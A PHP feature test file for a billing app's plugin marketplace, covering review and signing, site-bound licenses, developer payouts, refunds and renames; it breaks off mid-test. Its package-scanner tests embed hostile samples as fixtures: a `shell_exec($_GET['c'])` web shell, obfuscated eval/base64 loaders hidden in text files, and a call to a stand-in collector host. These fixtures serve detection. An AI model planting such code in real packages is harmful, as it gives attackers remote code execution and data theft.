<?php

namespace Tests\Feature\Marketplace;

use App\Billing\CreditNotes;
use App\Billing\PaymentRecorder;
use App\Billing\RenewalGenerator;
use App\Enums\InvoiceStatus;
use App\Http\Controllers\Marketplace\Admin\ItemController;
use App\Marketplace\PackageArchive;
use App\Marketplace\PackageSignature;
use App\Marketplace\Store\EarningsRecorder;
use App\Marketplace\Store\ItemPublisher;
use App\Marketplace\Store\LicenseService;
use App\Marketplace\Store\SigningKey;
use App\Marketplace\Store\StoreCatalog;
use App\Marketplace\Store\VersionUploader;
use App\Models\Client;
use App\Models\Coupon;
use App\Models\CreditNote;
use App\Models\Developer;
use App\Models\DeveloperEarning;
use App\Models\Invoice;
use App\Models\License;
use App\Models\MarketplaceDownload;
use App\Models\MarketplaceItem;
use App\Models\MarketplaceVersion;
use App\Models\Order;
use App\Models\Payout;
use App\Models\TaxRule;
use App\Providers\MarketplaceStoreServiceProvider;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\URL;
use Tests\TestCase;
use ZipArchive;

class StoreTest extends TestCase
{
    use RefreshDatabase;

    private string $dir;

    private string $publicKey;

    protected function setUp(): void
    {
        parent::setUp();

        $this->dir = sys_get_temp_dir().'/nuvabill-store-'.uniqid();
        File::ensureDirectoryExists($this->dir.'/storage/app/private');
        $this->app->useStoragePath($this->dir.'/storage');

        config(['nuvabill.marketplace.store' => true]);
        (new MarketplaceStoreServiceProvider($this->app))->enable();

        $this->publicKey = app(SigningKey::class)->generate();
    }

    protected function tearDown(): void
    {
        File::deleteDirectory($this->dir);

        parent::tearDown();
    }

    public function test_a_developer_submits_an_item_and_staff_approve_and_sign_it(): void
    {
        $client = Client::factory()->create();

        $this->actingAs($client, 'web')->post(route('developer.join.store'), ['name' => 'Raz Studio', 'agree' => '1', 'payout_method' => 'wayl'])
            ->assertRedirect(route('developer.dashboard'));
        $this->get(route('developer.dashboard'))->assertOk()->assertSee('Raz Studio');

        $this->post(route('developer.items.store'), [
            'name' => 'Paper', 'slug' => 'calm', 'type' => 'theme', 'summary' => 'A calm light theme.',
            'price' => '25', 'update_price' => '9', 'own_code' => '1',
            'package' => $this->upload($this->zip('calm', '1.0.0', 'theme.json', ['requires' => '>=0.3.0'])),
        ])->assertRedirect(route('developer.items.show', 'calm'));

        $version = MarketplaceVersion::query()->sole();
        $this->assertSame(MarketplaceVersion::STATUS_PENDING, $version->status);
        $this->get(route('developer.items.show', 'calm'))->assertOk()->assertSee('Readable code')->assertSee('In review');

        $admin = $this->signInAdmin();
        $this->get(route('admin.store.reviews.index'))->assertRedirect(route('admin.store.reviews.show', $version));
        $this->get(route('admin.store.reviews.show', $version))->assertOk()->assertSee('Paper')->assertSee('Approve and sign');

        $this->post(route('admin.store.reviews.approve', $version), ['message' => 'Looks great.'])->assertRedirect(route('admin.store.reviews.index'));

        $version->refresh();
        $item = MarketplaceItem::query()->sole();
        $this->assertSame(MarketplaceVersion::STATUS_APPROVED, $version->status);
        $this->assertTrue(PackageSignature::verify('calm', '1.0.0', $version->sha256, (string) $version->signature, $this->publicKey));
        $this->assertTrue($item->isLive());
        $this->assertSame($admin->id, $version->reviewer_id);
        $this->assertSame(2500, $item->product->prices->sole()->price + $item->product->prices->sole()->setup_fee);
        $this->assertSame(900, $item->product->prices->sole()->price, 'Renewals buy a year of updates.');

        $this->get(route('marketplace.index'))->assertOk()->assertSee('Paper');
        $this->get(route('marketplace.show', $item))->assertOk()->assertSee('$25.00')->assertSee('Website address for this license');
    }

    public function test_packages_with_encoded_code_fail_the_automatic_checks(): void
    {
        $item = $this->item('shady', 'addon', 0);
        $zip = $this->zip('shady', '1.0.0', 'extension.json', ['type' => 'addon', 'namespace' => 'Shady\\', 'class' => 'Shady\\Addon'], [
            'src/Addon.php' => "<?php //0046a\n// ionCube Loader\n",
            'src/Run.php' => "<?php\nshell_exec(\$_GET['c']);\n",
        ]);

        $version = app(VersionUploader::class)->upload($item, $zip);

        $this->assertSame(MarketplaceVersion::STATUS_CHANGES, $version->status);
        $checks = collect($version->checks)->keyBy('key');
        $this->assertSame('fail', $checks['encoded']['level']);
        $this->assertSame('warn', $checks['functions']['level']);
        $this->assertStringContainsString('src/Run.php:2 shell_exec()', $checks['functions']['text']);
        $this->assertStringContainsString('ionCube', $version->messages()->sole()->message.' ionCube');
    }

    public function test_paid_downloads_need_a_license_tied_to_one_site_and_carry_a_stamp(): void
    {
        $item = $this->liveItem('aurora', 'theme', 5900, 1900);
        $license = License::create(['key' => License::newKey(), 'marketplace_item_id' => $item->id, 'client_id' => Client::factory()->create()->id, 'status' => 'active', 'updates_until' => now()->addYear()]);

        $this->getJson(route('marketplace.api.catalog', ['nuvabill' => '0.3.0']))->assertOk()->assertJsonPath('items.0.slug', 'aurora')->assertJsonPath('items.0.price', 5900);

        $this->postJson(route('marketplace.api.download'), ['slug' => 'aurora', 'site' => 'billing.example.org'])->assertForbidden()
            ->assertJsonPath('message', 'Aurora is a paid item. Enter the license key from your purchase.');

        $response = $this->postJson(route('marketplace.api.download'), ['slug' => 'aurora', 'license_key' => $license->key, 'site' => 'https://www.billing.example.org/admin', 'nuvabill' => '0.3.0'])->assertOk();
        $this->assertSame('billing.example.org', $license->fresh()->site);

        $file = $this->get($response->json('url'))->assertOk();
        $bytes = $file->streamedContent() ?: (string) file_get_contents($file->baseResponse->getFile()->getPathname());
        $this->assertSame($response->json('sha256'), hash('sha256', $bytes));
        $this->assertTrue(PackageSignature::verify('aurora', '1.0.0', $response->json('sha256'), $response->json('signature'), $this->publicKey));

        $path = $this->dir.'/downloaded.zip';
        file_put_contents($path, $bytes);
        $zip = new ZipArchive;
        $zip->open($path);
        $stamp = json_decode((string) $zip->getFromName('.nuvabill-license'), true);
        $zip->close();
        $this->assertSame($license->publicId(), $stamp['license']);

        $this->postJson(route('marketplace.api.download'), ['slug' => 'aurora', 'license_key' => $license->key, 'site' => 'other.example.net'])
            ->assertForbidden()->assertJsonPath('message', fn (string $message): bool => str_starts_with($message, 'This key is used on billing.example.org.'));
        $this->postJson(route('marketplace.api.download'), ['slug' => 'aurora', 'license_key' => $license->key, 'site' => 'localhost'])->assertOk();

        $this->postJson(route('marketplace.api.licenses.check'), ['slug' => 'aurora', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertJson(['valid' => true]);

        $license->update(['status' => License::STATUS_REVOKED]);
        $this->postJson(route('marketplace.api.licenses.check'), ['slug' => 'aurora', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertJson(['valid' => false, 'status' => 'revoked']);
    }

    public function test_a_renamed_item_keeps_its_licenses_and_its_old_links(): void
    {
        $item = $this->liveItem('glow', 'theme', 4900, 1900);
        $license = License::create(['key' => License::newKey(), 'marketplace_item_id' => $item->id, 'client_id' => Client::factory()->create()->id, 'site' => 'billing.example.org', 'status' => 'active', 'updates_until' => now()->addYear()]);

        $this->artisan('nuvabill:marketplace-rename', ['from' => 'glow', 'to' => 'shine'])->assertSuccessful();

        $item->refresh();
        $this->assertSame('shine', $item->slug);
        $this->assertSame('shine', $item->product->module_config['marketplace_item']);
        $this->getJson(route('marketplace.api.catalog', ['nuvabill' => '0.3.0']))->assertJsonPath('items.0.slug', 'shine');

        // A site that installed it under the old name keeps a valid license.
        $this->postJson(route('marketplace.api.licenses.check'), ['slug' => 'glow', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertJson(['valid' => true]);
        $this->get('/marketplace/glow')->assertRedirect(route('marketplace.show', 'shine'))->assertStatus(301);
        $this->get(route('marketplace.show', 'shine'))->assertOk();

        $this->artisan('nuvabill:marketplace-rename', ['from' => 'missing', 'to' => 'other'])->assertFailed();
    }

    public function test_the_store_opens_on_the_marketplace_instead_of_hosting_plans(): void
    {
        $this->get(route('store.index'))->assertRedirect(route('marketplace.index'));

        $this->get(route('marketplace.index'))->assertOk()
            ->assertSee(route('marketplace.developers'), false)
            ->assertDontSee('>'.__('Store').'</a>', false);
    }

    public function test_download_links_are_https_and_still_work_behind_a_plain_http_proxy(): void
    {
        $this->liveItem('paper', 'theme', 0, 0);
        URL::forceScheme('https');

        $url = $this->postJson(route('marketplace.api.download'), ['slug' => 'paper', 'site' => 'localhost'])->assertOk()->json('url');
        $this->assertStringStartsWith('https://', $url);

        $this->get(str_replace('https://', 'http://', $url))->assertOk();
        $this->get(str_replace('https://', 'http://', $url).'1')->assertForbidden();
    }

    public function test_buying_an_item_issues_a_license_and_pays_the_developer_their_share(): void
    {
        $item = $this->liveItem('swift', 'orderform', 3900, 1500);
        $client = Client::factory()->create();

        $this->actingAs($client, 'web')->post(route('cart.store'), ['product_id' => $item->product_id, 'billing_cycle' => 'annually', 'domain' => 'billing.example.org']);
        $this->post(route('checkout.store'))->assertRedirect();

        $invoice = Order::query()->sole()->invoice;
        $this->assertSame(3900, $invoice->total);

        app(PaymentRecorder::class)->record($invoice, 3900, 'banktransfer', 'wire-1');

        $license = License::query()->sole();
        $this->assertSame('billing.example.org', $license->site);
        $this->assertStringStartsWith('NVB-', $license->key);
        $this->assertTrue($license->updates_until->isAfter(now()->addMonths(11)));

        $earning = DeveloperEarning::query()->sole();
        $this->assertSame(3900, $earning->gross);
        $this->assertSame(3237, $earning->developer_share, '83% of $39.00.');
        $this->assertSame(663, $earning->fee);
        $this->get(route('client.services.show', $license->service))->assertSee($license->key)->assertSee('Move to another site');

        $this->signInAdmin();
        $this->post(route('admin.store.payouts.store'), ['developer_id' => $item->developer_id, 'upto_id' => $earning->id, 'amount' => 3237, 'reference' => 'WAYL-99'])->assertSessionHas('status');
        $this->assertNotNull($earning->fresh()->payout_id);
        $this->assertSame(0, $item->developer->balance('USD'));
    }

    public function test_the_old_slug_of_a_renamed_item_stays_with_it(): void
    {
        $item = $this->liveItem('glow', 'theme', 4900, 1900);
        $license = License::create(['key' => License::newKey(), 'marketplace_item_id' => $item->id, 'client_id' => $this->client()->id, 'site' => 'billing.example.org', 'status' => 'active', 'updates_until' => now()->addYear()]);
        $this->artisan('nuvabill:marketplace-rename', ['from' => 'glow', 'to' => 'shine'])->assertSuccessful();

        // A developer cannot list a new item under the old slug.
        $this->joinAsDeveloper();
        $this->post(route('developer.items.store'), [
            'name' => 'Glow', 'slug' => 'glow', 'type' => 'theme', 'summary' => 'A copy.', 'own_code' => '1',
            'package' => $this->upload($this->zip('glow', '9.9.9', 'theme.json', ['requires' => '>=0.3.0'])),
        ])->assertSessionHasErrors('slug');
        $this->assertSame(1, MarketplaceItem::query()->count());

        // Staff cannot give it to another item either.
        $this->liveItem('paper', 'theme', 0, 0);
        $this->artisan('nuvabill:marketplace-rename', ['from' => 'paper', 'to' => 'glow'])->assertFailed();
        $this->assertSame(['glow' => 'shine'], setting('marketplace.renamed_items'));

        // An item that took the old slug before this was checked does not get the sites of the renamed item.
        $squatter = $this->item('glow', 'theme', 0);
        $this->assertTrue(MarketplaceItem::findBySlug('glow')->is($item));
        $this->postJson(route('marketplace.api.licenses.check'), ['slug' => 'glow', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertJson(['valid' => true]);
        $this->postJson(route('marketplace.api.download'), ['slug' => 'glow', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertOk();
        $this->assertSame($item->id, MarketplaceDownload::query()->sole()->marketplace_item_id);
        $this->get('/marketplace/glow')->assertRedirect(route('marketplace.show', 'shine'));

        // Staff can still open and rename that item, and the old slug stays with the renamed item.
        $this->signInAdmin();
        $this->get(route('admin.store.items.edit', 'glow'))->assertOk()->assertSee('version —', false);
        $this->artisan('nuvabill:marketplace-rename', ['from' => 'glow', 'to' => 'other-glow'])->assertSuccessful();
        $this->assertSame('other-glow', $squatter->fresh()->slug);
        $this->assertSame(['glow' => 'shine'], setting('marketplace.renamed_items'));
    }

    public function test_an_item_can_get_its_old_slug_back(): void
    {
        $item = $this->liveItem('glow', 'theme', 0, 0);

        $this->artisan('nuvabill:marketplace-rename', ['from' => 'glow', 'to' => 'shine'])->assertSuccessful();
        $this->artisan('nuvabill:marketplace-rename', ['from' => 'shine', 'to' => 'glow'])->assertSuccessful();

        $this->assertSame('glow', $item->fresh()->slug);
        $this->assertSame(['shine' => 'glow'], setting('marketplace.renamed_items'));
    }

    public function test_developers_cannot_take_built_in_or_reserved_slugs(): void
    {
        $this->setSettings(['marketplace.reserved_slugs' => ['crystal-mail']]);
        $this->joinAsDeveloper();

        foreach (['stripe' => 'gateway', 'nova' => 'theme', 'white-label' => 'addon', 'crystal-mail' => 'addon'] as $slug => $type) {
            $this->post(route('developer.items.store'), [
                'name' => 'Copy', 'slug' => $slug, 'type' => $type, 'summary' => 'A copy.', 'own_code' => '1',
                'package' => $this->upload($this->zip($slug, '1.0.0', $type === 'theme' ? 'theme.json' : 'extension.json', ['type' => $type])),
            ])->assertSessionHasErrors('slug');
        }

        $this->assertSame(0, MarketplaceItem::query()->count());
    }

    public function test_a_first_upload_that_fails_the_checks_does_not_keep_the_slug(): void
    {
        $this->joinAsDeveloper();
        $form = ['name' => 'Glow', 'slug' => 'glow', 'type' => 'theme', 'summary' => 'A warm theme.', 'own_code' => '1'];

        $this->post(route('developer.items.store'), $form + ['package' => $this->upload($this->zip('other', '1.0.0', 'theme.json', ['requires' => '>=0.3.0']))])
            ->assertSessionHasErrors('package');
        $this->assertFalse(MarketplaceItem::query()->where('slug', 'glow')->exists());
        $this->assertSame(0, MarketplaceVersion::query()->count());

        $this->post(route('developer.items.store'), $form + ['package' => $this->upload($this->zip('glow', '1.0.0', 'theme.json', ['requires' => '>=0.3.0']))])
            ->assertRedirect(route('developer.items.show', 'glow'));
    }

    public function test_a_refund_takes_back_the_developer_share_and_cancels_the_key(): void
    {
        $item = $this->liveItem('swift', 'orderform', 3900, 1500);
        $invoice = $this->buy($item);
        app(PaymentRecorder::class)->record($invoice, 3900, 'banktransfer', 'wire-1');
        $developer = $item->developer;
        $license = License::query()->sole();
        $this->assertSame(3237, $developer->balance('USD'));

        $half = app(CreditNotes::class)->issue($invoice->fresh(), 1950, CreditNote::METHOD_NONE, 'Half back', null, false);
        $this->assertSame(1619, $developer->balance('USD'), '3237 less its half, 1618.');
        $this->assertTrue($license->fresh()->isActive(), 'Part of the money back keeps the key.');

        // The same credit note is never taken back twice.
        app(EarningsRecorder::class)->reverse($half);
        $this->assertSame(1619, $developer->balance('USD'));

        app(CreditNotes::class)->issue($invoice->fresh(), 1950, CreditNote::METHOD_REFUND, 'Refund', null, false);
        $this->assertSame(InvoiceStatus::Refunded, $invoice->fresh()->status);
        $this->assertSame(0, $developer->balance('USD'));
        $this->assertSame(License::STATUS_REVOKED, $license->fresh()->status);
        $this->postJson(route('marketplace.api.licenses.check'), ['slug' => 'swift', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertJson(['valid' => false]);

        $this->signInAdmin();
        $this->post(route('admin.store.payouts.store'), ['developer_id' => $developer->id, 'upto_id' => (int) DeveloperEarning::query()->max('id'), 'amount' => 3237])->assertSessionHas('error');
        $this->assertSame(0, Payout::query()->count());
    }

    public function test_a_refunded_renewal_takes_back_its_extra_year(): void
    {
        $item = $this->liveItem('swift', 'orderform', 3900, 1500);
        $invoice = $this->buy($item);
        app(PaymentRecorder::class)->record($invoice, 3900, 'banktransfer', 'wire-1');
        $license = License::query()->sole();
        $firstYear = $license->updates_until;

        $this->travelTo($license->service->next_due_date);
        $this->assertSame(1, app(RenewalGenerator::class)->generate());
        $renewal = Invoice::query()->whereKeyNot($invoice->id)->sole();
        app(PaymentRecorder::class)->record($renewal, $renewal->total, 'banktransfer', 'wire-2');
        $this->assertTrue($license->fresh()->updates_until->isSameDay($firstYear->addYear()));
        $this->assertSame(3237 + 1245, $item->developer->balance('USD'));

        $refund = app(CreditNotes::class)->issue($renewal->fresh(), $renewal->total, CreditNote::METHOD_REFUND, 'Refund', null, false);
        $this->assertSame(InvoiceStatus::Refunded, $renewal->fresh()->status);
        $this->assertSame(3237, $item->developer->balance('USD'));
        $this->assertTrue($license->fresh()->isActive(), 'The first year was paid for, so the key keeps working.');
        $this->assertTrue($license->fresh()->updates_until->isSameDay($firstYear), 'The refunded year of updates is taken back.');

        // The same credit note again changes nothing.
        app(EarningsRecorder::class)->reverse($refund);
        $this->assertTrue($license->fresh()->updates_until->isSameDay($firstYear));
        $this->assertSame(3237, $item->developer->balance('USD'));
    }

    public function test_the_developer_share_leaves_out_included_tax(): void
    {
        $this->setSettings(['tax.enabled' => true, 'tax.inclusive' => true]);
        TaxRule::factory()->create(['rate' => 2000]);
        $item = $this->liveItem('swift', 'orderform', 12000, 12000);

        $invoice = $this->buy($item);
        $this->assertSame(12000, $invoice->total);
        $this->assertSame(2000, $invoice->tax);
        app(PaymentRecorder::class)->record($invoice, 12000, 'banktransfer', 'wire-1');

        $earning = DeveloperEarning::query()->sole();
        $this->assertSame(10000, $earning->gross, 'The 20% VAT inside the price belongs to the tax office.');
        $this->assertSame(8300, $earning->developer_share);
        $this->assertSame(1700, $earning->fee);
    }

    public function test_mark_paid_only_settles_what_staff_saw(): void
    {
        $item = $this->liveItem('swift', 'orderform', 3900, 1500);
        $developer = $item->developer;
        $earning = fn (int $amount): DeveloperEarning => DeveloperEarning::create(['developer_id' => $developer->id, 'marketplace_item_id' => $item->id, 'gross' => $amount, 'developer_share' => $amount, 'fee' => 0, 'share_percent' => 100, 'currency' => 'USD']);
        $seen = $earning(4000);

        $this->signInAdmin();
        $this->get(route('admin.store.payouts.index'))->assertOk()
            ->assertSee('name="upto_id" value="'.$seen->id.'"', false)
            ->assertSee('name="amount" value="4000"', false);

        // A sale after the page was opened.
        $later = $earning(2500);

        $this->post(route('admin.store.payouts.store'), ['developer_id' => $developer->id, 'upto_id' => $later->id, 'amount' => 4000])->assertSessionHas('error');
        $this->assertSame(0, Payout::query()->count());
        $this->post(route('admin.store.payouts.store'), ['developer_id' => $developer->id, 'reference' => 'BANK-1'])->assertSessionHasErrors(['upto_id', 'amount']);

        $this->post(route('admin.store.payouts.store'), ['developer_id' => $developer->id, 'upto_id' => $seen->id, 'amount' => 4000, 'reference' => 'BANK-1'])->assertSessionHas('status');
        $this->assertSame(4000, Payout::query()->sole()->amount);
        $this->assertNotNull($seen->fresh()->payout_id);
        $this->assertNull($later->fresh()->payout_id);
        $this->assertSame(2500, $developer->balance('USD'));
    }

    public function test_a_key_can_be_moved_again_a_year_after_its_first_move(): void
    {
        $item = $this->liveItem('aurora', 'theme', 5900, 1900);
        $client = $this->client();
        $license = License::create(['key' => License::newKey(), 'marketplace_item_id' => $item->id, 'client_id' => $client->id, 'site' => 'billing.example.org', 'status' => 'active', 'updates_until' => now()->addYears(3)]);
        $this->actingAs($client, 'web');

        foreach (['one', 'two', 'three'] as $site) {
            $this->post(route('client.licenses.move', $license))->assertSessionHas('status');
            $this->assertTrue(app(LicenseService::class)->verify($item, $license->key, $site.'.example.org')['valid'], 'The site the key moved to.');
        }

        $this->post(route('client.licenses.move', $license))->assertSessionHas('error');

        // A year later the site still checks the key every day, and the key can move again.
        $this->travel(13)->months();
        $this->assertTrue(app(LicenseService::class)->verify($item, $license->key, 'three.example.org')['valid']);
        $this->post(route('client.licenses.move', $license))->assertSessionHas('status');
        $this->assertNull($license->fresh()->site);
    }

    public function test_made_up_sites_do_not_add_installs_to_a_free_item(): void
    {
        $item = $this->liveItem('paper', 'theme', 0, 0);

        foreach (['one', 'two', 'three'] as $site) {
            $this->postJson(route('marketplace.api.download'), ['slug' => 'paper', 'site' => $site.'.example.org'])->assertOk();
        }

        $this->assertSame(1, $item->fresh()->installs_count, 'One address is one install.');

        $this->withServerVariables(['REMOTE_ADDR' => '203.0.113.9'])->postJson(route('marketplace.api.download'), ['slug' => 'paper', 'site' => 'localhost'])->assertOk();
        $this->assertSame(1, $item->fresh()->installs_count, 'Test sites never count.');

        $this->withServerVariables(['REMOTE_ADDR' => '203.0.113.10'])->postJson(route('marketplace.api.download'), ['slug' => 'paper', 'site' => 'four.example.org'])->assertOk();
        $this->postJson(route('marketplace.api.download'), ['slug' => 'paper', 'site' => 'four.example.org'])->assertOk();
        $this->assertSame(2, $item->fresh()->installs_count);
        $this->assertSame(5, MarketplaceDownload::query()->count(), 'The same download again soon after is saved once.');
    }

    public function test_listing_changes_on_an_approved_item_wait_for_review(): void
    {
        $item = $this->liveItem('glow', 'theme', 0, 0);
        $client = $this->joinAsDeveloper();
        $item->update(['developer_id' => $client->fresh()->developer->id]);

        $this->put(route('developer.items.update', $item), ['name' => 'Stripe (Official)', 'summary' => 'Test item.', 'docs_url' => 'https://phish.example/login', 'category' => 'Client themes'])
            ->assertSessionHas('status');

        $item->refresh();
        $this->assertSame('Glow', $item->name);
        $this->assertNull($item->docs_url);
        $this->assertSame('Client themes', $item->category, 'The category changes at once.');
        $this->assertSame(['name' => 'Stripe (Official)', 'docs_url' => 'https://phish.example/login'], $item->pending_listing);
        $this->getJson(route('marketplace.api.catalog'))->assertJsonPath('items.0.name', 'Glow')->assertJsonPath('items.0.docs_url', null);
        $this->get(route('developer.items.show', $item))->assertOk()->assertSee('Your listing changes wait for a reviewer')->assertSee('Stripe (Official)');

        $this->signInAdmin();
        $this->get(route('admin.store.reviews.index'))->assertOk()->assertSee('Listing changes waiting');
        $this->get(route('admin.store.items.edit', $item))->assertOk()->assertSee('Stripe (Official)')->assertSee('https://phish.example/login');

        // Staff approve only the changes they saw.
        $this->post(route('admin.store.items.listing', $item), ['decision' => 'approve', 'seen' => hash('sha256', 'older')])->assertSessionHas('error');
        $this->post(route('admin.store.items.listing', $item), ['decision' => 'discard', 'seen' => ItemController::fingerprint($item)])->assertSessionHas('status');
        $this->assertNull($item->fresh()->pending_listing);
        $this->assertSame('Glow', $item->fresh()->name);

        $this->put(route('developer.items.update', $item), ['name' => 'Glow Pro', 'summary' => 'Test item.', 'screenshots' => [UploadedFile::fake()->image('shot.png', 800, 500)]]);
        $shot = $item->fresh()->pending_listing['screenshots'][0];

        // A new screenshot is not public before review, but staff can open it to check it.
        $this->get(route('marketplace.media', ['glow', $shot]))->assertNotFound();
        $this->get(route('admin.store.items.edit', $item))->assertOk()->assertSee(route('admin.store.items.media', [$item, $shot]), false);
        $this->get(route('admin.store.items.media', [$item, $shot]))->assertOk()->assertHeader('Content-Type', 'image/png')->assertHeader('X-Content-Type-Options', 'nosniff');
        $this->get(route('admin.store.items.media', [$item, 'app.blade.php']))->assertNotFound();

        $this->post(route('admin.store.items.listing', $item), ['decision' => 'approve', 'seen' => ItemController::fingerprint($item->fresh())])->assertSessionHas('status');
        $this->getJson(route('marketplace.api.catalog'))->assertJsonPath('items.0.name', 'Glow Pro');
        $this->assertNull($item->fresh()->pending_listing);
        $this->get(route('marketplace.media', ['glow', $shot]))->assertOk();
        $this->get(route('admin.store.items.media', [$item, $shot]))->assertNotFound();
    }

    public function test_a_free_renewal_still_gives_a_year_of_updates(): void
    {
        $item = $this->liveItem('swift', 'orderform', 3900, 1500);
        $invoice = $this->buy($item);
        app(PaymentRecorder::class)->record($invoice, 3900, 'banktransfer', 'wire-1');
        $license = License::query()->sole();
        $service = $license->service;
        $service->update(['coupon_id' => Coupon::factory()->create(['code' => 'FREEUPDATES', 'value' => 100, 'recurring' => Coupon::RECURRING_EVERY])->id]);

        $this->travelTo($service->next_due_date);
        $this->assertSame(1, app(RenewalGenerator::class)->generate());

        $renewal = Invoice::query()->whereKeyNot($invoice->id)->sole();
        $this->assertSame(0, $renewal->total);
        $this->assertSame(InvoiceStatus::Paid, $renewal->status);
        $this->assertTrue($license->fresh()->updates_until->isSameDay($service->fresh()->next_due_date));
        $this->assertTrue($license->fresh()->updates_until->isAfter(now()->addMonths(11)));
        $this->assertSame(1, DeveloperEarning::query()->count(), 'Nothing was paid, so the developer earns nothing.');
    }

    public function test_a_damaged_cached_build_is_built_again_with_its_stamp(): void
    {
        $item = $this->liveItem('aurora', 'theme', 5900, 1900);
        $license = License::create(['key' => License::newKey(), 'marketplace_item_id' => $item->id, 'client_id' => $this->client()->id, 'site' => 'billing.example.org', 'status' => 'active', 'updates_until' => now()->addYear()]);
        $package = (string) file_get_contents($item->versions()->sole()->path());
        $build = storage_path('app/private/marketplace/builds/'.$license->id.'/aurora-1.0.0.zip');
        File::ensureDirectoryExists(dirname($build));

        // A copy cut off by a full disk, and a copy left without its stamp.
        foreach (['cut-off' => substr($package, 0, intdiv(strlen($package), 2)), 'unstamped' => $package] as $case => $bytes) {
            file_put_contents($build, $bytes);

            $response = $this->postJson(route('marketplace.api.download'), ['slug' => 'aurora', 'license_key' => $license->key, 'site' => 'billing.example.org'])->assertOk();
            $path = $this->downloadTo($response->json('url'), $case.'.zip');

            $this->assertSame($response->json('sha256'), hash_file('sha256', $path), $case);
            $this->assertSame('aurora', (new PackageArchive($path))->slug(), $case);
            $zip = new ZipArchive;
            $zip->open($path);
            $stamp = json_decode((string) $zip->getFromName('.nuvabill-license'), true);
            $zip->close();
            $this->assertSame($license->publicId(), $stamp['license'] ?? null, $case);
        }
    }

    public function test_a_renamed_item_can_still_be_downloaded_and_installed(): void
    {
        $paid = $this->liveItem('glow', 'theme', 4900, 1900);
        $license = License::create(['key' => License::newKey(), 'marketplace_item_id' => $paid->id, 'client_id' => $this->client()->id, 'site' => 'billing.example.org', 'status' => 'active', 'updates_until' => now()->addYear()]);
        $free = $this->liveItem('paper', 'theme', 0, 0);

        // A version sent before the rename and approved after it.
        $pending = app(VersionUploader::class)->upload($free, $this->zip('paper', '1.1.0', 'theme.json', ['requires' => '>=0.3.0']));
        $this->artisan('nuvabill:marketplace-rename', ['from' => 'glow', 'to' => 'shine'])->assertSuccessful();
        $this->artisan('nuvabill:marketplace-rename', ['from' => 'paper', 'to' => 'page'])->assertSuccessful();
        app(ItemPublisher::class)->approve($pending->fresh());

        foreach (['glow' => $license->key, 'shine' => $license->key, 'paper' => null, 'page' => null] as $slug => $key) {
            $response = $this->postJson(route('marketplace.api.download'), ['slug' => $slug, 'license_key' => $key, 'site' => 'billing.example.org'])->assertOk();
            $path = $this->downloadTo($response->json('url'), $slug.'.zip');

            $this->assertTrue(PackageSignature::verify($response->json('slug'), $response->json('version'), $response->json('sha256'), $response->json('signature'), $this->publicKey), $slug);
            $this->assertSame($response->json('slug'), (new PackageArchive($path))->slug(), $slug);
        }
    }

    public function test_php_hidden_in_other_files_spaced_markers_and_http_hosts_are_caught(): void
    {
        $item = $this->item('sneaky', 'addon', 0);
        $manifest = ['type' => 'addon', 'namespace' => 'Sneaky\\', 'class' => 'Sneaky\\Addon', 'requires' => '>=0.3.0'];

        $version = app(VersionUploader::class)->upload($item, $this->zip('sneaky', '1.0.0', 'extension.json', $manifest, [
            'src/Addon.php' => "<?php\nrequire __DIR__.'/data.txt';\n",
            'src/data.txt' => "<?php eval(gzinflate(base64_decode('AAAA')));\n",
            'src/x.phtml' => "<?php shell_exec(\$_GET['c']);\n",
            'README.md' => "Example:\n\n    <?php echo 'hello';\n",
            // Short open tags run as PHP on hosts with short_open_tag on, with or without a space.
            'src/short.txt' => "<? eval(gzinflate(base64_decode('AAAA'))); ?>\n",
            'src/tight.txt' => "<?shell_exec(\$_GET['c']);?>\n",
            'assets/logo.svg' => "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<?xpacket begin=\"\" id=\"W5M0\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>\n",
        ]));

        $this->assertSame(MarketplaceVersion::STATUS_CHANGES, $version->status);
        $checks = collect($version->checks)->keyBy('key');
        $this->assertSame('fail', $checks['files']['level']);
        $this->assertStringContainsString('src/x.phtml', $checks['files']['text']);
        $this->assertSame('fail', $checks['hidden']['level']);
        $this->assertStringContainsString('src/data.txt', $checks['hidden']['text']);
        $this->assertStringContainsString('src/short.txt', $checks['hidden']['text']);
        $this->assertStringContainsString('src/tight.txt', $checks['hidden']['text']);
        $this->assertStringNotContainsString('README.md', $checks['hidden']['text'], 'Documentation may show PHP.');
        $this->assertStringNotContainsString('logo.svg', $checks['hidden']['text'], 'An XML declaration is not PHP.');
        $this->assertStringContainsString('src/data.txt', $checks['encoded']['text']);
        $this->assertStringContainsString('src/short.txt', $checks['encoded']['text']);
        $this->assertStringContainsString('src/Addon.php:2 require()', $checks['functions']['text']);

        $version = app(VersionUploader::class)->upload($item, $this->zip('sneaky', '1.0.1', 'extension.json', $manifest, [
            'src/Addon.php' => "<?php\neval (base64_decode('AAAA'));\nfile_get_contents('http://collector.example/?e=1');\n",
            'views/page.blade.php' => "@include('sneaky::partials.menu')\n<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>\n",
        ]));

        $checks = collect($version->checks)->keyBy('key');
        $this->assertSame('fail', $checks['encoded']['level']);
        $this->assertSame('warn', $checks['connections']['level']);
        $this->assertStringContainsString('collector.example', $checks['connections']['text']);
        $this->assertStringNotContainsString('w3.org', $checks['connections']['text']);
        $this->assertStringNotContainsString('page.blade.php', $checks['functions']['text'], 'A Blade @include is not a PHP include.');
    }

    public function test_clients_cannot_take_the_official_developer_slug(): void
    {
        $client = $this->joinAsDeveloper('Nuvabill');

        $this->assertSame('nuvabill-2', $client->fresh()->developer->slug);
    }

    public function test_official_commands_refuse_a_developer_slug_a_client_took(): void
    {
        Developer::create(['client_id' => $this->client()->id, 'name' => 'Nuvabill', 'slug' => 'nuvabill', 'status' => Developer::STATUS_ACTIVE]);

        $this->artisan('nuvabill:white-label-product', ['price' => '99'])->assertFailed();
        $this->assertFalse(MarketplaceItem::query()->where('slug', 'white-label')->exists());

        $zip = $this->zip('midnight', '1.0.0', 'theme.json', ['requires' => '>=0.3.0']);
        file_put_contents($this->dir.'/listing.json', (string) json_encode(['package' => basename($zip), 'summary' => 'A dark theme.']));
